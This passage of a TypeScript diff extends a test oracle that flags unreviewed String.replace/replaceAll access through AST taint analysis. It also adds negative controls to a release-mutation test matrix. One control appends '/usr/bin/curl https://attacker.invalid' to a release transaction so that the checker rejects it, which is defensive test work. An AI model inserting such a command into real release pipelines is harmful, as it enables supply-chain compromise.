-  if (!ts.isCallExpression(call) || call.expression !== node || call.arguments.length !== 2) return false;
+  if (!ts.isCallExpression(call) || call.expression !== node || call.arguments.length !== 2) return null;
   const pattern = call.arguments[0];
   const replacement = call.arguments[1];
   if (
     pattern === undefined ||
     replacement === undefined ||
     !ts.isRegularExpressionLiteral(pattern) ||
-    pattern.getText(sourceFile) !== "/\\s+/g" ||
-    !ts.isStringLiteral(replacement) ||
-    replacement.text !== " "
+    !ts.isStringLiteral(replacement)
   ) {
-    return false;
+    return null;
   }
 
   const declaration = call.parent;
+  if (
+    !ts.isVariableDeclaration(declaration) ||
+    declaration.initializer !== call ||
+    !ts.isIdentifier(declaration.name)
+  ) {
+    return null;
+  }
+
+  const reviewed = REVIEWED_DOCS_ORDINARY_TRANSFORMS.find(
+    (candidate) =>
+      candidate.binding === declaration.name.text &&
+      candidate.receiver === receiver.text &&
+      candidate.pattern === pattern.getText(sourceFile) &&
+      candidate.replacement === replacement.text
+  );
+  return reviewed !== undefined && hasExactReviewedTransformOwner(reviewed.id, declaration, sourceFile)
+    ? reviewed.id
+    : null;
+}
+
+type ForbiddenReplaceMethod = "replace" | "replaceAll";
+
+/** Collect statically initialized computed-property aliases for forbidden method spellings. */
+function forbiddenComputedMethodAliases(
+  sourceFile: ts.SourceFile
+): ReadonlyMap<string, ReadonlySet<ForbiddenReplaceMethod>> {
+  const initializers = new Map<string, ts.Expression[]>();
+  function collect(node: ts.Node): void {
+    if (ts.isVariableDeclaration(node) && ts.isIdentifier(node.name) && node.initializer !== undefined) {
+      const existing = initializers.get(node.name.text) ?? [];
+      existing.push(node.initializer);
+      initializers.set(node.name.text, existing);
+    }
+    ts.forEachChild(node, collect);
+  }
+  collect(sourceFile);
+
+  const resolved = new Map<string, Set<ForbiddenReplaceMethod>>();
+  function expressionMethods(expression: ts.Expression): Set<ForbiddenReplaceMethod> {
+    const current = unwrapStaticExpression(expression);
+    const literal = staticStringExpressionText(current);
+    if (literal === "replace" || literal === "replaceAll") return new Set([literal]);
+    if (ts.isIdentifier(current)) return new Set(resolved.get(current.text) ?? []);
+    if (ts.isConditionalExpression(current)) {
+      return new Set([...expressionMethods(current.whenTrue), ...expressionMethods(current.whenFalse)]);
+    }
+    return new Set();
+  }
+
+  for (let pass = 0; pass <= initializers.size; pass++) {
+    let changed = false;
+    for (const [name, expressions] of initializers) {
+      const methods = resolved.get(name) ?? new Set<ForbiddenReplaceMethod>();
+      const before = methods.size;
+      for (const expression of expressions) {
+        for (const method of expressionMethods(expression)) methods.add(method);
+      }
+      if (methods.size !== before) changed = true;
+      if (methods.size > 0) resolved.set(name, methods);
+    }
+    if (!changed) break;
+  }
+  return resolved;
+}
+
+/** Resolve a computed property only when its spelling or alias is statically reviewed. */
+function computedMethodText(
+  expression: ts.Expression | undefined,
+  aliases: ReadonlyMap<string, ReadonlySet<ForbiddenReplaceMethod>>
+): ForbiddenReplaceMethod | null {
+  if (expression === undefined) return null;
+  const current = unwrapStaticExpression(expression);
+  const literal = staticStringExpressionText(current);
+  if (literal === "replace" || literal === "replaceAll") return literal;
+  if (ts.isIdentifier(current)) return [...(aliases.get(current.text) ?? [])].sort()[0] ?? null;
+  if (ts.isConditionalExpression(current)) {
+    return computedMethodText(current.whenTrue, aliases) ?? computedMethodText(current.whenFalse, aliases);
+  }
+  return null;
+}
+
+/** Dynamic computed callees are fail-closed because replace/replaceAll cannot be excluded. */
+function isDynamicComputedMethodUse(node: ts.ElementAccessExpression): boolean {
+  const parent = node.parent;
+  if (ts.isCallExpression(parent) && parent.expression === node) return true;
   return (
-    ts.isVariableDeclaration(declaration) &&
-    declaration.initializer === call &&
-    ts.isIdentifier(declaration.name) &&
-    declaration.name.text === "normalizedLifecycle"
+    ts.isPropertyAccessExpression(parent) &&
+    parent.expression === node &&
+    (parent.name.text === "call" || parent.name.text === "apply" || parent.name.text === "bind")
   );
 }
 
-/** Reject every raw String.replace/replaceAll value access except one exact reviewed transform. */
+interface BoundOracleSource {
+  readonly checker: ts.TypeChecker;
+  readonly sourceFile: ts.SourceFile;
+}
+
+/** Bind one candidate without resolving imports or loading the standard library. */
+function bindOracleSource(filename: string, source: string): BoundOracleSource {
+  const virtualFilename = `/__repository_mutation_oracle__/${filename}`;
+  const options: ts.CompilerOptions = {
+    module: ts.ModuleKind.ESNext,
+    noLib: true,
+    noResolve: true,
+    target: ts.ScriptTarget.Latest
+  };
+  const candidate = ts.createSourceFile(virtualFilename, source, ts.ScriptTarget.Latest, true, ts.ScriptKind.TS);
+  const host = ts.createCompilerHost(options, true);
+  host.fileExists = (requested) => requested === virtualFilename;
+  host.getSourceFile = (requested) => (requested === virtualFilename ? candidate : undefined);
+  host.readFile = (requested) => (requested === virtualFilename ? source : undefined);
+  const program = ts.createProgram({ host, options, rootNames: [virtualFilename] });
+  const sourceFile = program.getSourceFile(virtualFilename);
+  if (sourceFile === undefined) throw new Error(`repository mutation oracle could not bind ${filename}`);
+  return { checker: program.getTypeChecker(), sourceFile };
+}
+
+interface DynamicMethodTaintAnalysis {
+  readonly expressionIsTainted: (expression: ts.Expression) => boolean;
+}
+
+/**
+ * Propagate unresolved computed method values by symbol, including direct local
+ * argument-to-parameter flow and direct local function returns.
+ */
+function dynamicComputedMethodTaintAnalysis(
+  sourceFile: ts.SourceFile,
+  checker: ts.TypeChecker,
+  aliases: ReadonlyMap<string, ReadonlySet<ForbiddenReplaceMethod>>
+): DynamicMethodTaintAnalysis {
+  const valueEdges: Array<{ readonly expression: ts.Expression; readonly target: ts.Symbol }> = [];
+  const returnEdges: Array<{ readonly expression: ts.Expression; readonly target: ts.Symbol }> = [];
+  const propertyEdges: Array<{
+    readonly expression: ts.Expression;
+    readonly key: string;
+    readonly owner: ts.Symbol;
+  }> = [];
+  const objectAliasEdges: Array<{ readonly source: ts.Symbol; readonly target: ts.Symbol }> = [];
+  const callExpressions: ts.CallExpression[] = [];
+  const localFunctions = new Map<ts.Symbol, ts.FunctionLikeDeclaration>();
+  const functionSymbols = new Map<ts.FunctionLikeDeclaration, ts.Symbol>();
+
+  const symbolOf = (identifier: ts.Identifier): ts.Symbol | null => checker.getSymbolAtLocation(identifier) ?? null;
+  function registerFunction(symbol: ts.Symbol | null, declaration: ts.FunctionLikeDeclaration): void {
+    if (symbol === null) return;
+    localFunctions.set(symbol, declaration);
+    functionSymbols.set(declaration, symbol);
+  }
+  function collectFunctions(node: ts.Node): void {
+    if (ts.isFunctionDeclaration(node) && node.name !== undefined) {
+      registerFunction(symbolOf(node.name), node);
+    } else if (
+      ts.isVariableDeclaration(node) &&
+      ts.isIdentifier(node.name) &&
+      node.initializer !== undefined &&
+      (ts.isArrowFunction(node.initializer) || ts.isFunctionExpression(node.initializer))
+    ) {
+      registerFunction(symbolOf(node.name), node.initializer);
+    }
+    ts.forEachChild(node, collectFunctions);
+  }
+  collectFunctions(sourceFile);
+
+  function collectReturns(declaration: ts.FunctionLikeDeclaration, symbol: ts.Symbol): void {
+    if (ts.isArrowFunction(declaration) && !ts.isBlock(declaration.body)) {
+      returnEdges.push({ expression: declaration.body, target: symbol });
+      return;
+    }
+    const body = declaration.body;
+    if (body === undefined) return;
+    function visitReturn(node: ts.Node): void {
+      if (node !== body && ts.isFunctionLike(node)) return;
+      if (ts.isReturnStatement(node) && node.expression !== undefined) {
+        returnEdges.push({ expression: node.expression, target: symbol });
+      }
+      ts.forEachChild(node, visitReturn);
+    }
+    visitReturn(body);
+  }
+  for (const [declaration, symbol] of functionSymbols) collectReturns(declaration, symbol);
+
+  function collectObjectLiteralEdges(owner: ts.Symbol, object: ts.ObjectLiteralExpression): void {
+    for (const property of object.properties) {
+      if (!ts.isPropertyAssignment(property)) continue;
+      const key = staticPropertyText(property.name);
+      if (key !== null) propertyEdges.push({ expression: property.initializer, key, owner });
+    }
+  }
+
+  function collectEdges(node: ts.Node): void {
+    if (ts.isVariableDeclaration(node) && ts.isIdentifier(node.name) && node.initializer !== undefined) {
+      const target = symbolOf(node.name);
+      if (target !== null) {
+        valueEdges.push({ expression: node.initializer, target });
+        const initializer = unwrapStaticExpression(node.initializer);
+        if (ts.isObjectLiteralExpression(initializer)) collectObjectLiteralEdges(target, initializer);
+        if (ts.isIdentifier(initializer)) {
+          const source = symbolOf(initializer);
+          if (source !== null) objectAliasEdges.push({ source, target });
+        }
+      }
+    }
+    if (ts.isBinaryExpression(node) && node.operatorToken.kind === ts.SyntaxKind.EqualsToken) {
+      const left = unwrapStaticExpression(node.left);
+      if (ts.isIdentifier(left)) {
+        const target = symbolOf(left);
+        if (target !== null) {
+          valueEdges.push({ expression: node.right, target });
+          const right = unwrapStaticExpression(node.right);
+          if (ts.isObjectLiteralExpression(right)) collectObjectLiteralEdges(target, right);
+          if (ts.isIdentifier(right)) {
+            const source = symbolOf(right);
+            if (source !== null) objectAliasEdges.push({ source, target });
+          }
+        }
+      } else if (ts.isPropertyAccessExpression(left) || ts.isElementAccessExpression(left)) {
+        const ownerExpression = unwrapStaticExpression(left.expression);
+        const key = ts.isPropertyAccessExpression(left)
+          ? left.name.text
+          : staticStringExpressionText(left.argumentExpression ?? left);
+        if (ts.isIdentifier(ownerExpression) && key !== null) {
+          const owner = symbolOf(ownerExpression);
+          if (owner !== null) propertyEdges.push({ expression: node.right, key, owner });
+        }
+      }
+    }
+    if (ts.isCallExpression(node)) {
+      callExpressions.push(node);
+    }
+    ts.forEachChild(node, collectEdges);
+  }
+  collectEdges(sourceFile);
+
+  // Close direct local function identity over exact-symbol aliases before
+  // deriving argument-to-parameter edges at any call site.
+  for (let pass = 0; pass <= valueEdges.length; pass++) {
+    let changed = false;
+    for (const edge of valueEdges) {
+      const source = unwrapStaticExpression(edge.expression);
+      if (!ts.isIdentifier(source) || localFunctions.has(edge.target)) continue;
+      const sourceSymbol = symbolOf(source);
+      const declaration = sourceSymbol === null ? undefined : localFunctions.get(sourceSymbol);
+      if (declaration !== undefined) {
+        localFunctions.set(edge.target, declaration);
+        changed = true;
+      }
+    }
+    if (!changed) break;
+  }
+  for (const call of callExpressions) {
+    const callee = unwrapStaticExpression(call.expression);
+    if (!ts.isIdentifier(callee)) continue;
+    const calleeSymbol = symbolOf(callee);
+    const declaration = calleeSymbol === null ? undefined : localFunctions.get(calleeSymbol);
+    if (declaration === undefined) continue;
+    for (const [index, parameter] of declaration.parameters.entries()) {
+      const argument = call.arguments[index];
+      if (argument === undefined || !ts.isIdentifier(parameter.name)) continue;
+      const target = symbolOf(parameter.name);
+      if (target !== null) valueEdges.push({ expression: argument, target });
+    }
+  }
+
+  const taintedValues = new Set<ts.Symbol>();
+  const taintedReturns = new Set<ts.Symbol>();
+  const taintedProperties = new Map<ts.Symbol, Set<string>>();
+  const propertyIsTainted = (owner: ts.Symbol, key: string): boolean => taintedProperties.get(owner)?.has(key) ?? false;
+  const expressionIsTainted = (expression: ts.Expression): boolean => {
+    const current = unwrapStaticExpression(expression);
+    if (ts.isAwaitExpression(current)) return expressionIsTainted(current.expression);
+    if (ts.isIdentifier(current)) {
+      const symbol = symbolOf(current);
+      return symbol !== null && taintedValues.has(symbol);
+    }
+    if (ts.isConditionalExpression(current)) {
+      return expressionIsTainted(current.whenTrue) || expressionIsTainted(current.whenFalse);
+    }
+    if (
+      ts.isBinaryExpression(current) &&
+      (current.operatorToken.kind === ts.SyntaxKind.QuestionQuestionToken ||
+        current.operatorToken.kind === ts.SyntaxKind.BarBarToken ||
+        current.operatorToken.kind === ts.SyntaxKind.AmpersandAmpersandToken)
+    ) {
+      return expressionIsTainted(current.left) || expressionIsTainted(current.right);
+    }
+    if (ts.isCallExpression(current)) {
+      const callee = unwrapStaticExpression(current.expression);
+      if (!ts.isIdentifier(callee)) return false;
+      const symbol = symbolOf(callee);
+      return symbol !== null && taintedReturns.has(symbol);
+    }
+    if (ts.isPropertyAccessExpression(current) || ts.isElementAccessExpression(current)) {
+      const owner = unwrapStaticExpression(current.expression);
+      const propertyName = ts.isPropertyAccessExpression(current)
+        ? current.name.text
+        : staticStringExpressionText(current.argumentExpression ?? current);
+      if (propertyName !== null && ts.isObjectLiteralExpression(owner)) {
+        const property = owner.properties.find(
+          (candidate) => ts.isPropertyAssignment(candidate) && staticPropertyText(candidate.name) === propertyName
+        );
+        if (property !== undefined && ts.isPropertyAssignment(property)) {
+          return expressionIsTainted(property.initializer);
+        }
+      }
+      if (propertyName !== null && ts.isIdentifier(owner)) {
+        const ownerSymbol = symbolOf(owner);
+        if (ownerSymbol !== null && propertyIsTainted(ownerSymbol, propertyName)) return true;
+      }
+      if (ts.isElementAccessExpression(current)) {
+        if (propertyName !== null) return propertyName === "replace" || propertyName === "replaceAll";
+        return computedMethodText(current.argumentExpression, aliases) === null;
+      }
+      return false;
+    }
+    return false;
+  };
+
+  const edgeCount = valueEdges.length + returnEdges.length + propertyEdges.length + objectAliasEdges.length;
+  for (let pass = 0; pass <= edgeCount; pass++) {
+    let changed = false;
+    for (const edge of valueEdges) {
+      if (!taintedValues.has(edge.target) && expressionIsTainted(edge.expression)) {
+        taintedValues.add(edge.target);
+        changed = true;
+      }
+      const source = unwrapStaticExpression(edge.expression);
+      if (ts.isIdentifier(source)) {
+        const sourceSymbol = symbolOf(source);
+        if (sourceSymbol !== null && taintedReturns.has(sourceSymbol) && !taintedReturns.has(edge.target)) {
+          taintedReturns.add(edge.target);
+          changed = true;
+        }
+      }
+    }
+    for (const edge of returnEdges) {
+      if (!taintedReturns.has(edge.target) && expressionIsTainted(edge.expression)) {
+        taintedReturns.add(edge.target);
+        changed = true;
+      }
+    }
+    for (const edge of propertyEdges) {
+      if (!propertyIsTainted(edge.owner, edge.key) && expressionIsTainted(edge.expression)) {
+        const keys = taintedProperties.get(edge.owner) ?? new Set<string>();
+        keys.add(edge.key);
+        taintedProperties.set(edge.owner, keys);
+        changed = true;
+      }
+    }
+    for (const edge of objectAliasEdges) {
+      const sourceKeys = taintedProperties.get(edge.source);
+      if (sourceKeys === undefined) continue;
+      const targetKeys = taintedProperties.get(edge.target) ?? new Set<string>();
+      const before = targetKeys.size;
+      for (const key of sourceKeys) targetKeys.add(key);
+      if (targetKeys.size !== before) {
+        taintedProperties.set(edge.target, targetKeys);
+        changed = true;
+      }
+    }
+    if (!changed) break;
+  }
+  return { expressionIsTainted };
+}
+
+/** True when an extracted unresolved computed value reaches an invocation sink. */
+function isTaintedDynamicMethodInvocation(node: ts.CallExpression, analysis: DynamicMethodTaintAnalysis): boolean {
+  const callee = unwrapStaticExpression(node.expression);
+  if (ts.isElementAccessExpression(callee)) return false;
+  if (
+    (ts.isPropertyAccessExpression(callee) || ts.isElementAccessExpression(callee)) &&
+    ts.isElementAccessExpression(unwrapStaticExpression(callee.expression))
+  ) {
+    return false;
+  }
+  if (analysis.expressionIsTainted(callee)) return true;
+  if (
+    (ts.isPropertyAccessExpression(callee) || ts.isElementAccessExpression(callee)) &&
+    analysis.expressionIsTainted(callee.expression)
+  ) {
+    const method = ts.isPropertyAccessExpression(callee)
+      ? callee.name.text
+      : staticStringExpressionText(callee.argumentExpression ?? callee);
+    return method === "call" || method === "apply" || method === "bind";
+  }
+  return false;
+}
+
+/** Reject raw replace-spelled method access except exact, live reviewed transforms. */
 function repositoryMutationOracleProblems(filename: string, source: string): string[] {
-  const sourceFile = ts.createSourceFile(filename, source, ts.ScriptTarget.Latest, true, ts.ScriptKind.TS);
+  const { checker, sourceFile } = bindOracleSource(filename, source);
   const problems: string[] = [];
-  let reviewedTransforms = 0;
+  const reviewedTransformCounts = new Map<ReviewedDocsOrdinaryTransformId, number>();
+  const computedAliases = forbiddenComputedMethodAliases(sourceFile);
+  const dynamicMethodTaint = dynamicComputedMethodTaintAnalysis(sourceFile, checker, computedAliases);
 
   function location(node: ts.Node): string {
     const position = sourceFile.getLineAndCharacterOfPosition(node.getStart(sourceFile));
@@ -359,42 +1383,75 @@ function repositoryMutationOracleProblems(filename: string, source: string): str
   }
 
   function visit(node: ts.Node): void {
+    if (ts.isCallExpression(node) && isTaintedDynamicMethodInvocation(node, dynamicMethodTaint)) {
+      problems.push(
+        `${filename}:${location(node)} invokes a value extracted from an unresolved dynamic computed method; ` +
+          "replace/replaceAll cannot be excluded"
+      );
+    }
     if (ts.isPropertyAccessExpression(node) || ts.isElementAccessExpression(node)) {
       const method = ts.isPropertyAccessExpression(node)
         ? staticPropertyText(node.name)
-        : staticPropertyText(node.argumentExpression);
+        : computedMethodText(node.argumentExpression, computedAliases);
       if ((method === "replace" || method === "replaceAll") && !isTypeOnlyAccess(node)) {
-        if (ts.isPropertyAccessExpression(node) && isReviewedLifecycleNormalization(filename, node, sourceFile)) {
-          reviewedTransforms++;
+        const reviewedId = ts.isPropertyAccessExpression(node)
+          ? reviewedDocsOrdinaryTransformId(filename, node, sourceFile)
+          : null;
+        if (reviewedId !== null) {
+          reviewedTransformCounts.set(reviewedId, (reviewedTransformCounts.get(reviewedId) ?? 0) + 1);
         } else {
           problems.push(`${filename}:${location(node)} has unclassified raw .${method} access`);
         }
+      } else if (
+        ts.isElementAccessExpression(node) &&
+        method === null &&
+        !isTypeOnlyAccess(node) &&
+        isDynamicComputedMethodUse(node)
+      ) {
+        problems.push(
+          `${filename}:${location(node)} has unclassified dynamic computed method access; replace/replaceAll cannot be excluded`
+        );
       }
     }
     if (ts.isBindingElement(node) && ts.isObjectBindingPattern(node.parent)) {
-      const method = staticPropertyText(node.propertyName ?? node.name);
+      const method =
+        node.propertyName !== undefined && ts.isComputedPropertyName(node.propertyName)
+          ? computedMethodText(node.propertyName.expression, computedAliases)
+          : staticPropertyText(node.propertyName ?? node.name);
       if (method === "replace" || method === "replaceAll") {
         problems.push(`${filename}:${location(node)} has unclassified raw .${method} binding`);
+      } else if (node.propertyName !== undefined && ts.isComputedPropertyName(node.propertyName) && method === null) {
+        problems.push(
+          `${filename}:${location(node)} has unclassified dynamic computed binding; replace/replaceAll cannot be excluded`
+        );
       }
     }
     if (
       (ts.isPropertyAssignment(node) || ts.isShorthandPropertyAssignment(node)) &&
       isDestructuringAssignmentProperty(node)
     ) {
-      const method = staticPropertyText(node.name);
+      const method = ts.isComputedPropertyName(node.name)
+        ? computedMethodText(node.name.expression, computedAliases)
+        : staticPropertyText(node.name);
       if (method === "replace" || method === "replaceAll") {
         problems.push(`${filename}:${location(node)} has unclassified raw .${method} assignment binding`);
+      } else if (ts.isComputedPropertyName(node.name) && method === null) {
+        problems.push(
+          `${filename}:${location(node)} has unclassified dynamic computed assignment binding; replace/replaceAll cannot be excluded`
+        );
       }
     }
     ts.forEachChild(node, visit);
   }
 
   visit(sourceFile);
-  const expectedReviewedTransforms = filename === "docs-consistency.test.ts" ? 1 : 0;
-  if (reviewedTransforms !== expectedReviewedTransforms) {
-    problems.push(
-      `${filename} expected ${expectedReviewedTransforms} reviewed ordinary transform(s), found ${reviewedTransforms}`
-    );
+  if (filename === "docs-consistency.test.ts") {
+    for (const reviewed of REVIEWED_DOCS_ORDINARY_TRANSFORMS) {
+      const actual = reviewedTransformCounts.get(reviewed.id) ?? 0;
+      if (actual !== 1) {
+        problems.push(`${filename} expected exactly one ${reviewed.id}, found ${actual}`);
+      }
+    }
   }
   return problems;
 }
@@ -977,6 +2034,30 @@ describe("META-invariant: exact structural census + NEGATIVE control coverage", 
     const historicalBaselineProblems = preparedAudit.auditMatrix(matrixSource);
     const historicalMutationProblems = (candidate: string): string[] =>
       diagnosticMultisetDifference(preparedAudit.auditMatrix(candidate), historicalBaselineProblems);
+    const historicalFixtureMutationProblems = (candidateFixture: string): string[] =>
+      diagnosticMultisetDifference(
+        releaseMutationIdentityAuditProblems(matrixSource, candidateFixture),
+        historicalBaselineProblems
+      );
+    const crossGenerationMutationProblems = (candidate: string): string[] => [
+      ...historicalMutationProblems(candidate),
+      ...releaseMutationVersionedTransitionAuditProblems(candidate, fixtureBefore, transitionAuthority)
+    ];
+    const versionedProblemsWithCoarseWitnessesRepinned = (candidate: string): string[] => {
+      const observation = observeReleaseMutationTransitionMatrix(candidate);
+      if (observation.matrixSliceSha256 === null) throw new Error("causal control lost the current matrix slice");
+      const repinnedAuthority = JSON.parse(transitionAuthority) as {
+        current: { matrixSliceSha256: string; matrixSourceSha256: string };
+      };
+      repinnedAuthority.current.matrixSourceSha256 = observation.sourceSha256;
+      repinnedAuthority.current.matrixSliceSha256 = observation.matrixSliceSha256;
+      return releaseMutationVersionedTransitionAuditProblems(
+        candidate,
+        fixtureBefore,
+        JSON.stringify(repinnedAuthority)
+      );
+    };
+    expect(crossGenerationMutationProblems(matrixSource)).toEqual([]);
     // Subtract the historical auditor's known current-transition debt as a multiset. Its detailed
     // mutation diagnostics remain useful, but pre-existing v2-vs-v3 findings cannot satisfy a
     // candidate's negative control or mask a missing candidate-specific diagnostic.
@@ -985,6 +2066,31 @@ describe("META-invariant: exact structural census + NEGATIVE control coverage", 
     expect(firstRepeatedProblems).toEqual([
       expect.stringMatching(/release mutation hybrid current source must retain exact SHA-256/)
     ]);
+
+    // NEGATIVE control: a singleton primary matcher must remain an unconditional direct
+    // callback statement. Wrapping the exact matcher in a branch preserves its bytes but
+    // destroys the causal guarantee that the mutation is actually asserted.
+    const singletonCaseFoldedMatcher = [
+      "    expect(githubWorkflowSchemaProblems(caseFoldedEnvMutation)).toContainEqual(",
+      "      expect.stringMatching(/case-insensitive duplicate NPM_CONFIG_REGISTRY\\/npm_config_registry/)",
+      "    );"
+    ].join("\n");
+    const conditionalSingletonMatcher = replaceExactly(
+      matrixSource,
+      singletonCaseFoldedMatcher,
+      `    if (false) {\n${singletonCaseFoldedMatcher}\n    }`
+    );
+    const conditionalSingletonProblems = versionedProblemsWithCoarseWitnessesRepinned(conditionalSingletonMatcher);
+    expect(conditionalSingletonProblems).not.toEqual(
+      expect.arrayContaining([expect.stringMatching(/current matrix (?:source|slice) witness mismatch/)])
+    );
+    expect(conditionalSingletonProblems).toEqual(
+      expect.arrayContaining([
+        expect.stringMatching(
+          /release mutation hybrid singleton primary matcher .*release\.case\.m001.*unconditional direct execution/
+        )
+      ])
+    );
 
     // NEGATIVE controls: the narrow template support accepts only passive identifier
     // interpolations. A call or property access must not become executable while the
@@ -1095,7 +2201,7 @@ describe("META-invariant: exact structural census + NEGATIVE control coverage", 
       "6339e5c510913eafb1defe67939b667f2d19461df01fe4e791b3ee7afb2a8909",
       "2523c1c577061ab48258e780f02ccda0cba9ca0ac209d9cf3362a2e7680fc9b1"
     );
-    const sameHashRemainingProblems = releaseMutationIdentityAuditProblems(matrixSource, sameHashRemainingFixture);
+    const sameHashRemainingProblems = historicalFixtureMutationProblems(sameHashRemainingFixture);
     expect(sameHashRemainingProblems).toContainEqual(
       expect.stringMatching(/release mutation identity fixture must remain byte-exact SHA-256/)
     );
@@ -3255,13 +4361,95 @@ describe("META-invariant: exact structural census + NEGATIVE control coverage", 
       sharedRegistryMatcherLoop,
       ["    weakenedRegistrySteps.reverse();", sharedRegistryMatcherLoop].join("\n")
     );
-    expect(historicalMutationProblems(reversedSharedRegistryIterable)).toEqual(
+    expect(crossGenerationMutationProblems(reversedSharedRegistryIterable)).toEqual(
       expect.arrayContaining([
         expect.stringMatching(/release mutation hybrid current source must retain exact SHA-256/),
         expect.stringMatching(/release mutation hybrid current matrix slice must retain exact SHA-256/),
         expect.stringMatching(
           /release mutation hybrid shared primary matcher 5e2815d5.*exact closed iterable\/runtime topology for 69 frozen root/
         )
+      ])
+    );
+
+    const splitReleaseLoop = [
+      "    for (const splitReleaseMutant of splitReleaseMutants) {",
+      "      expect(mcpbContractProblems({ ...mcpbInputs, release: splitReleaseMutant })).toContain(",
+      "        MCPB_SPLIT_RELEASE_CONTRACT_PROBLEM",
+      "      );",
+      "    }"
+    ].join("\n");
+    const taintedReleaseTransactionCase = [
+      [
+        "    const taintedTransaction = `",
+        "$",
+        "{mcpbInputs.releaseTransaction.slice(0, -1)}\\n/usr/bin/curl https://attacker.invalid\\n`;"
+      ].join(""),
+      '    const taintedTransactionHash = createHash("sha256").update(taintedTransaction).digest("hex");',
+      "    expect(",
+      "      mcpbContractProblems({",
+      "        ...mcpbInputs,",
+      "        release: replaceExactly(",
+      "          mcpbInputs.release,",
+      "          SPLIT_CONTRACT_SHA256.githubTransactionSource,",
+      "          taintedTransactionHash",
+      "        ),",
+      "        releaseTransaction: taintedTransaction",
+      "      })",
+      "    ).toContain(MCPB_SPLIT_RELEASE_CONTRACT_PROBLEM);"
+    ].join("\n");
+
+    // NEGATIVE control: a runtime transform between the exact array and shared loop
+    // must fail the closed iterable topology even though every root call and matcher is unchanged.
+    const reversedCurrentSplitIterable = replaceExactly(
+      matrixSource,
+      splitReleaseLoop,
+      ["    splitReleaseMutants.reverse();", splitReleaseLoop].join("\n")
+    );
+    const reversedCurrentSplitProblems = versionedProblemsWithCoarseWitnessesRepinned(reversedCurrentSplitIterable);
+    expect(reversedCurrentSplitProblems).not.toEqual(
+      expect.arrayContaining([expect.stringMatching(/current matrix (?:source|slice) witness mismatch/)])
+    );
+    expect(reversedCurrentSplitProblems).toEqual(
+      expect.arrayContaining([
+        expect.stringMatching(
+          /release mutation transition shared primary matcher .*exact closed iterable\/runtime topology for 53 current root/
+        )
+      ])
+    );
+
+    // NEGATIVE control: current-only cases have frozen runtime order too. Moving the
+    // shared m582-m626 family across m627 must fail after only coarse SHA witnesses are repinned.
+    const reorderedCurrentSplitCases = replaceExactly(
+      matrixSource,
+      `${splitReleaseLoop}\n${taintedReleaseTransactionCase}`,
+      `${taintedReleaseTransactionCase}\n${splitReleaseLoop}`
+    );
+    const reorderedCurrentSplitProblems = versionedProblemsWithCoarseWitnessesRepinned(reorderedCurrentSplitCases);
+    expect(reorderedCurrentSplitProblems).not.toEqual(
+      expect.arrayContaining([expect.stringMatching(/current matrix (?:source|slice) witness mismatch/)])
+    );
+    expect(reorderedCurrentSplitProblems).toEqual(
+      expect.arrayContaining([
+        expect.stringMatching(
+          /global case execution order must equal exact frozen primary-oracle order; .*expected release\.case\.m582.*found release\.case\.m627/
+        )
+      ])
+    );
+
+    // NEGATIVE control: a callback return can make every later matcher unreachable
+    // without changing its AST bytes, so the current transition observer must reject it directly.
+    const earlyCurrentMatrixReturn = replaceExactly(
+      matrixSource,
+      "    const splitReleaseMutants = [",
+      "    if (true) return;\n    const splitReleaseMutants = ["
+    );
+    const earlyCurrentMatrixReturnProblems = versionedProblemsWithCoarseWitnessesRepinned(earlyCurrentMatrixReturn);
+    expect(earlyCurrentMatrixReturnProblems).not.toEqual(
+      expect.arrayContaining([expect.stringMatching(/current matrix (?:source|slice) witness mismatch/)])
+    );
+    expect(earlyCurrentMatrixReturnProblems).toEqual(
+      expect.arrayContaining([
+        expect.stringMatching(/matrix callback must not return before all case executions; found return at/)
       ])
     );
 
@@ -3279,7 +4467,7 @@ describe("META-invariant: exact structural census + NEGATIVE control coverage", 
         "    }"
       ].join("\n")
     );
-    expect(historicalMutationProblems(aliasedSharedRegistryIterable)).toEqual(
+    expect(crossGenerationMutationProblems(aliasedSharedRegistryIterable)).toEqual(
       expect.arrayContaining([
         expect.stringMatching(/release mutation hybrid current source must retain exact SHA-256/),
         expect.stringMatching(/release mutation hybrid current matrix slice must retain exact SHA-256/),
@@ -3296,7 +4484,7 @@ describe("META-invariant: exact structural census + NEGATIVE control coverage", 
       "    for (const weakenedRegistryStep of weakenedRegistrySteps) {",
       "    for (const weakenedRegistryStep of weakenedRegistrySteps.slice()) {"
     );
-    expect(historicalMutationProblems(copiedSharedRegistryIterable)).toEqual(
+    expect(crossGenerationMutationProblems(copiedSharedRegistryIterable)).toEqual(
       expect.arrayContaining([
         expect.stringMatching(/release mutation hybrid current source must retain exact SHA-256/),
         expect.stringMatching(/release mutation hybrid current matrix slice must retain exact SHA-256/),
@@ -3313,7 +4501,7 @@ describe("META-invariant: exact structural census + NEGATIVE control coverage", 
       sharedRegistryMatcherLoop,
       ["    if (false) {", sharedRegistryMatcherLoop, "    }"].join("\n")
     );
-    expect(historicalMutationProblems(wrappedSharedRegistryMatcher)).toEqual(
+    expect(crossGenerationMutationProblems(wrappedSharedRegistryMatcher)).toEqual(
       expect.arrayContaining([
         expect.stringMatching(/release mutation hybrid current source must retain exact SHA-256/),
         expect.stringMatching(/release mutation hybrid current matrix slice must retain exact SHA-256/),
@@ -3330,7 +4518,7 @@ describe("META-invariant: exact structural census + NEGATIVE control coverage", 
       sharedRegistryMatcherLoop,
       ["    if (true) return;", sharedRegistryMatcherLoop].join("\n")
     );
-    expect(historicalMutationProblems(returnedBeforeSharedRegistryMatcher)).toEqual(
+    expect(crossGenerationMutationProblems(returnedBeforeSharedRegistryMatcher)).toEqual(
       expect.arrayContaining([
         expect.stringMatching(/release mutation hybrid current source must retain exact SHA-256/),
         expect.stringMatching(/release mutation hybrid current matrix slice must retain exact SHA-256/),
@@ -3345,7 +4533,7 @@ describe("META-invariant: exact structural census + NEGATIVE control coverage", 
       '{ ...registryStep, if: "always()" }',
       '(() => { throw new Error("ownerless-prefix-bypass"); })()'
     );
-    expect(historicalMutationProblems(poisonedRegistryOwnerlessPrefix)).toEqual(
+    expect(crossGenerationMutationProblems(poisonedRegistryOwnerlessPrefix)).toEqual(
       expect.arrayContaining([
         expect.stringMatching(/release mutation hybrid current source must retain exact SHA-256/),
         expect.stringMatching(/release mutation hybrid current matrix slice must retain exact SHA-256/),
@@ -3362,7 +4550,7 @@ describe("META-invariant: exact structural census + NEGATIVE control coverage", 
       "      registryStepWithRun(fragmentedCurlWriteRun),",
       "      (false ? registryStepWithRun(fragmentedCurlWriteRun) : registryStep),"
     );
-    expect(historicalMutationProblems(discardedRegistryCarrier)).toEqual(
+    expect(crossGenerationMutationProblems(discardedRegistryCarrier)).toEqual(
       expect.arrayContaining([
